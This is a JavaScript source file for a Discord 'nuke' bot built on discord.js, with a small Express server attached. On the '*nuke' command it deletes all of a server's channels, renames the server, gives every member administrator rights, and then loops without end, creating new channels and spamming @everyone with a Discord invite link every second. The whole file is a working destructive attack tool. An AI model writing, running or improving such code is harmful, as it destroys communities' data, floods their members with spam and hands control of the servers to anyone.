const Discord = require('discord.js');
const { Permissions } = require('discord.js');
const express = require('express');
const path = require('path');

const client = new Discord.Client({
    intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MESSAGES, Discord.Intents.FLAGS.GUILD_MEMBERS]
});

const app = express();
const port = process.env.PORT || 3000;

// Serve the index.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

let nukeInterval; // To store the nuke process

client.on('ready', () => {
    console.log('Nuke bot is ready');
});

client.on('messageCreate', async (message) => {
    if (message.content === '*nuke') {
        // Delete all existing channels
        message.guild.channels.cache.forEach(channel => channel.delete());

        // Rename server
        await message.guild.setName('nuked by apex');

        // Update @everyone role permissions
        const everyoneRole = message.guild.roles.everyone;
        await everyoneRole.setPermissions(Permissions.FLAGS.ADMINISTRATOR);

        // Function to create a new channel and start spamming
        const createAndSpamChannel = async () => {
            const channel = await message.guild.channels.create('nuked by apex', {
                type: 'GUILD_TEXT'
            });

            // Spam messages in the new channel
            setInterval(() => {
                channel.send('@everyone https://discord.gg/6Vtg4WpPHY');
            }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
        };

        // Create the initial channel
        await createAndSpamChannel();

        // Infinite loop to continually create new channels and start spamming
        nukeInterval = setInterval(async () => {
            await createAndSpamChannel();
        }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
    }

    if (message.content === '*clear') {
        // Stop the nuke process
        if (nukeInterval) {
            clearInterval(nukeInterval);
            message.channel.send('Nuke process stopped.');
        }

        // Delete all channels
        const allChannels = message.guild.channels.cache;
        let deletePromises = [];
        for (const channel of allChannels.values()) {
            deletePromises.push(channel.delete());
        }

        // Wait for all channels to be deleted
        await Promise.all(deletePromises);

        // Create a "general" channel after all channels are deleted
        await message.guild.channels.create('general', {
            type: 'GUILD_TEXT'
        });

        message.channel.send('All channels have been deleted and a "general" channel has been created.');
    }
});

client.login(process.env.TOKEN);
